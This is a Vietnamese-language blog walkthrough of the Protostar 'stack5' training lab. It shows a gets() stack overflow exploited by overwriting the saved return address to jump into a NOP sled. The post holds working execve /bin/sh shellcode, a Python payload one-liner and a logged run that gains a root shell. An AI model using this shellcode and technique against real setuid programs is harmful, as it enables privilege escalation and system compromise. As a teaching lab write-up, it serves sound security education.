---
layout: post
title: stack5
---
Trong bài trước, chúng ta đã biết cách thay đổi giá trị `eip` của caller để điều hướng chương trình sau khi return từ callee.
Trong bài này, thay vì chỉ điều hướng đến những hàm có sẵn, chúng ta sẽ inject một đoạn mã vào bộ nhớ của chương trình và thực thi đoạn mã này.
Trước tiên, hãy xem source code của chương trình stack5:
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```
stack5 tương tự stack4. Chương trình này cũng dùng `gets` để nhập giá trị cho `buffer`. Kỹ thuật làm tràn bộ nhớ trong stack4 cũng sẽ được dùng ở đây. Sau đây là asm code của `main` trong stack5.
```asm
0x080483c4 <main+0>:    push   ebp
0x080483c5 <main+1>:    mov    ebp,esp
0x080483c7 <main+3>:    and    esp,0xfffffff0
0x080483ca <main+6>:    sub    esp,0x50
0x080483cd <main+9>:    lea    eax,[esp+0x10]
0x080483d1 <main+13>:   mov    DWORD PTR [esp],eax
0x080483d4 <main+16>:   call   0x80482e8 <gets@plt>
0x080483d9 <main+21>:   leave
0x080483da <main+22>:   ret
```
`buffer` sẽ chiếm bộ nhớ `esp + 0x10` đến `esp + 0x4f`.
Như đã giải thích trong bài trước, theo sau `buffer` là padding, `ebp` và `eip` của caller.
Chúng ta sẽ giả thiết padding là 8 byte.
(điều này đúng với đại đa số các lần chạy thử.)
Như vậy, tổng số byte cần nhập vào là 64 + 8 + 4 + 4 = 80 byte.

Giá trị cần ghi đè vào `eip` của caller sẽ là một địa chỉ trên stack, và là một trong những địa chỉ từ `esp + 0x10` đến `esp + 0x5f` đã lưu 80 byte.
Trong ví dụ đầu tiên sau đây, byte `\xcc` sẽ được dùng để thử nghiệm.
Cụ thể, byte `\xcc` là một lệnh có ý nghĩa như 1 breakpoint.
Khi instruction có mã này được chạy, chương trình sẽ thông báo đã chạm đến breakpoint.
Dùng gdb để kiếm tra bộ nhớ, ta thấy giá trị của `esp` là `0xbffff750`.
Do đó, ta sẽ chọn giá trị mới cho `eip` là từ `0xbffff760` đến `0xbffff79f`.
Sau đây là 1 ví dụ:
```bash
python -c "print '\xcc' * 64 + '\x60\xf7\xff\xbf' * 4" > input.txt
stack5 < input.txt
```
Bộ nhớ sau khi gọi hàm `gets` sẽ như sau. Phân biệt bằng màu: <span style="color:aqua">buffer</span> và <span style="color:orangered">eip của caller</span>.
<pre class="memory">
0xbffff750:     0xbffff760      0xb7ec6165      0xbffff768      0xb7eada75
0xbffff760:     <span style="color:aqua">0xcccccccc</span>      <span style="color:aqua">0xcccccccc</span>      <span style="color:aqua">0xcccccccc</span>      <span style="color:aqua">0xcccccccc</span>
0xbffff770:     <span style="color:aqua">0xcccccccc</span>      <span style="color:aqua">0xcccccccc</span>      <span style="color:aqua">0xcccccccc</span>      <span style="color:aqua">0xcccccccc</span>
0xbffff780:     <span style="color:aqua">0xcccccccc</span>      <span style="color:aqua">0xcccccccc</span>      <span style="color:aqua">0xcccccccc</span>      <span style="color:aqua">0xcccccccc</span>
0xbffff790:     <span style="color:aqua">0xcccccccc</span>      <span style="color:aqua">0xcccccccc</span>      <span style="color:aqua">0xcccccccc</span>      <span style="color:aqua">0xcccccccc</span>
0xbffff7a0:     0xbffff760      0xbffff760      0xbffff760      <span style="color:orangered">0xbffff760</span>
</pre>
Sau khi được nạp giá trị mới, <span style="color:orangered">địa chỉ</span> và <span style="color:yellow">lệnh</span> sau sẽ được thực thi ngay khi stack5 return.
<pre class="memory">
0xbffff750:     0xbffff760      0xb7ec6165      0xbffff768      0xb7eada75
<span style="color:orangered">0xbffff760</span>:     0x<span style="color:yellow">cc</span>cccccc      0xcccccccc      0xcccccccc      0xcccccccc
0xbffff770:     0xcccccccc      0xcccccccc      0xcccccccc      0xcccccccc
0xbffff780:     0xcccccccc      0xcccccccc      0xcccccccc      0xcccccccc
0xbffff790:     0xcccccccc      0xcccccccc      0xcccccccc      0xcccccccc
0xbffff7a0:     0xbffff760      0xbffff760      0xbffff760      0xbffff760

<span style="color:orangered">0xbffff760</span>:     <span style="color:yellow">int3</span>
</pre>
```bash
user@protostar:~$ stack5 < input.txt
Trace/breakpoint trap
```

Với 64 byte của `buffer`, chúng ta cần tìm hoặc viết chương trình có kích cỡ trong phạm vi này.
Các chương trình mẫu này có thể được tìm thấy trên internet với từ khóa shellcode.
Bản chất của các shellcode chính là mã máy, mà nếu disassemble ta sẽ được asm code tương tự như asm code của stack5.
Sau đây là đoạn shellcode dài 28 byte dùng để chạy chương trình /bin/dash trong linux:
```
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80
```
Lưu ý, đoạn chương trình này cần được chạy từ đầu đến cuối.
Nếu biết chính xác vị trí trên bộ nhớ lưu shellcode này, ta sẽ gán địa chỉ đó cho `eip` của caller.
Một kỹ thuật khác cho phép chọn địa chỉ `eip` một cách linh hoạt hơn là dùng chuỗi `nop` (có opcode `0x90`).
Đây là một trong số ít lệnh có thể dùng mà không sợ shellcode không bị lỗi hoặc không thể chạm đến.
Kỹ thuật này có tên là NOP-sled với nguyên lý là sử dụng chuỗi `nop` phía trước shellcode chính, sau đó ghi đè `eip` bằng 1 địa chỉ chứa `nop`.
Khi CPU chạy lênh `nop`, nó sẽ chỉ đơn giản là bỏ qua và chuyển tới lệnh kế tiếp. Việc này sẽ tiếp diễn cho đến CPU chạm tới shellcode.
Nếu không dùng `nop` và địa chỉ mới của `eip` cũng không chạm được tới shellcode, chương trình sẽ báo Illegal instruction và kết thúc.

Với ví dụ trên, ta có 36 byte `nop`, theo sau là 28 byte shellcode. Cụ thể như sau:
```bash
python -c "print '\x90' * 36 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + '\x80\xf7\xff\xbf' * 4" > input.txt
(cat input.txt ; cat) | stack5
```
<pre class="memory">
0xbffff750:     0xbffff760      0xb7ec6165      0xbffff768      0xb7eada75
0xbffff760:     <span style="color:aqua">0xb7fd7ff4</span>      <span style="color:aqua">0x0804958c</span>      <span style="color:aqua">0xbffff778</span>      <span style="color:aqua">0x080482c4</span>
0xbffff770:     <span style="color:aqua">0xb7ff1040</span>      <span style="color:aqua">0x0804958c</span>      <span style="color:aqua">0xbffff7a8</span>      <span style="color:aqua">0x08048409</span>
0xbffff780:     <span style="color:aqua">0xb7fd8304</span>      <span style="color:aqua">0xb7fd7ff4</span>      <span style="color:aqua">0x080483f0</span>      <span style="color:aqua">0xbffff7a8</span>
0xbffff790:     <span style="color:aqua">0xb7ec6365</span>      <span style="color:aqua">0xb7ff1040</span>      <span style="color:aqua">0x080483fb</span>      <span style="color:aqua">0xb7fd7ff4</span>
0xbffff7a0:     0x080483f0      0x00000000      0xbffff828      <span style="color:orangered">0xb7eadc76</span>
</pre>

<pre class="memory">
0xbffff750:     0xbffff760      0xb7ec6165      0xbffff768      0xb7eada75
0xbffff760:     <span style="color:aqua">0x90909090</span>      <span style="color:aqua">0x90909090</span>      <span style="color:aqua">0x90909090</span>      <span style="color:aqua">0x90909090</span>
0xbffff770:     <span style="color:aqua">0x90909090</span>      <span style="color:aqua">0x90909090</span>      <span style="color:aqua">0x90909090</span>      <span style="color:aqua">0x90909090</span>
0xbffff780:     <span style="color:aqua">0x90909090</span>      <span style="color:aqua">0x6850c031</span>      <span style="color:aqua">0x68732f2f</span>      <span style="color:aqua">0x69622f68</span>
0xbffff790:     <span style="color:aqua">0x89e3896e</span>      <span style="color:aqua">0xb0c289c1</span>      <span style="color:aqua">0x3180cd0b</span>      <span style="color:aqua">0x80cd40c0</span>
0xbffff7a0:     0xbffff780      0xbffff780      0xbffff780      <span style="color:orangered">0xbffff780</span>
</pre>

Phân biệt <span style="color:orangered">địa chỉ</span> và <span style="color:yellow">lệnh</span> sau sẽ được thực thi ngay khi stack5 return.
<pre class="memory">
0xbffff750:     0xbffff760      0xb7ec6165      0xbffff768      0xb7eada75
0xbffff760:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff770:     0x90909090      0x90909090      0x90909090      0x90909090
<span style="color:orangered">0xbffff780</span>:     0x<span style="color:yellow">90</span>909090      0x6850c031      0x68732f2f      0x69622f68
0xbffff790:     0x89e3896e      0xb0c289c1      0x3180cd0b      0x80cd40c0
0xbffff7a0:     0xbffff780      0xbffff780      0xbffff780      0xbffff780
</pre>

Sau đây là memory dưới dạng asm instruction.
Phân biệt <span style="color:orangered">địa chỉ eip mới</span>, <span style="color:yellow">lệnh</span> được thực thi ngay khi stack5 return, và <span style="color:springgreen">shellcode</span>.
<pre class="memory">
<span style="color:orangered">0xbffff780</span>:     <span style="color:yellow">nop</span>
0xbffff781:     nop
0xbffff782:     nop
0xbffff783:     nop
<span style="color:springgreen">0xbffff784</span>:     <span style="color:springgreen">xor    eax,eax</span>
<span style="color:springgreen">0xbffff786</span>:     <span style="color:springgreen">push   eax</span>
<span style="color:springgreen">0xbffff787</span>:     <span style="color:springgreen">push   0x68732f2f</span>
<span style="color:springgreen">0xbffff78c</span>:     <span style="color:springgreen">push   0x6e69622f</span>
<span style="color:springgreen">0xbffff791</span>:     <span style="color:springgreen">mov    ebx,esp</span>
<span style="color:springgreen">0xbffff793</span>:     <span style="color:springgreen">mov    ecx,eax</span>
<span style="color:springgreen">0xbffff795</span>:     <span style="color:springgreen">mov    edx,eax</span>
<span style="color:springgreen">0xbffff797</span>:     <span style="color:springgreen">mov    al,0xb</span>
<span style="color:springgreen">0xbffff799</span>:     <span style="color:springgreen">int    0x80</span>
<span style="color:springgreen">0xbffff79b</span>:     <span style="color:springgreen">xor    eax,eax</span>
<span style="color:springgreen">0xbffff79d</span>:     <span style="color:springgreen">inc    eax</span>
<span style="color:springgreen">0xbffff79e</span>:     <span style="color:springgreen">int    0x80</span>
</pre>
Trước khi chạm tới shellcode được lưu bắt đầu từ `0xbffff784`, 4 lệnh `nop` sẽ được chạy.

Cách exploit stack5 đầy đủ có thể được xem tại cuối bài.
Lưu ý với những chương trình như /bin/dash, người dùng có thể tiếp tục nhập lệnh vào tương tự như bash hay command prompt.
Để bạn có thể nhập vào, hãy dùng lệnh cat và pipe std input output sang stack5 như sau.
```bash
(cat input.txt ; cat) | stack5
```
input.txt được mở bởi cat và chuyển tiếp sang stack5, sau đó cat tiếp tục để mở để nhập thêm lệnh.
Sau khi chạy shellcode và mở /bin/dash thành công, bạn có thể thử nhập vào các lệnh cơ bản như cd, ls, hay mkdir.

Chạy lệnh sau đây trên bash sẽ cho bạn biết bạn có quyền gì với chương trình đang được chạy.
```bash
whoami
```
Một số những chương trình, trong đó stack5 là một ví dụ, sẽ được thực thi với quyền root, kể cả người chạy chương trình là user thông thường.
Quyền root là quyền cao nhất, cho phép bạn xem những file chứa thông tin bảo mật như password.
Do vậy nếu những chương trình này có lỗ hổng, hacker sẽ chiếm được quyền cao nhất để đánh cắp thông tin hoặc phá hoại.
Đây chính là hacking.

## Ref
```bash
user@protostar:~$ python -c "print '\x90' * 36 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + '\x80\xf7\xff\xbf' * 4" > input.txt
user@protostar:~$ (cat input.txt ; cat) | stack5
whoami
root
id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
exit

```
